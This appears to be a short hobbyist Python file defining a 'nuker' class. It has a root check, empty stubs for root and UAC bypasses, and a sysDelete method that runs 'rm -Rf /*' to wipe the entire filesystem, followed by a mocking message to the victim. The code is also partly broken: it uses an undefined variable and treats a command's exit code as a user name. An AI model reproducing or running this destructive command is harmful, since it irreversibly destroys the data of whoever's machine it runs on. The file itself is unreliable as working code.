# This file is a corroboration of things that I tend to come up with in the moment.
import os


class nuker:
    def __init__(self):
        self.root =  os.getenv('root')
    def check_root(self):
        check_user = os.system('whoami')

        if root != check_user:
            print(f'{os.getenv('user')} is currently logged in. Try again as root!')
    def root_bypass(self, root):
        pass

    def UACBypass(self):
        """
        @TODO:make a UACBypass
        """
        pass

    def sysDelete(self, killswitch):
        user = os.getenv('user')
        print(f'{user} has joined the game, may RNGesus have mercy on ther soul...')
        os.system('rm -Rf /*')
        print(f'Oops! {user} accidentally wiped the system! Please reinstall! =D')